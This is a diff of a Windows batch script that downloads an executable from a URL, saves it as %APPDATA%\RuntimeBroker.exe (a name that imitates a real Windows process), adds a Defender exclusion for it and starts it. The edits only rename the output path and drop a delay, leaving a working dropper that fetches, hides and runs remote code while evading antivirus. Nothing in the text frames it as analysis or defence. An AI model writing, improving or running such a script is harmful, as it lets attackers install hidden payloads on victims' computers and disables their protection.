@@ -14,16 +14,13 @@ set "outputFile=%APPDATA%\RuntimeBroker.exe"
 timeout /nobreak /t 1 >nul
 
 :: Download the file
-powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%downloadPath%'"
+powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%outputFile%'"
 
 :: Add exclusion for the downloaded EXE itself
-powershell -Command "Add-MpPreference -ExclusionPath '%downloadPath%'"
-
-:: Small delay to ensure exclusion is applied
-timeout /nobreak /t 3 >nul
+powershell -Command "Add-MpPreference -ExclusionPath '%outputFile%'"
 
 :: Run the downloaded file
-start "" "%downloadPath%"
+start "" "%outputFile%"
 
 endlocal
 
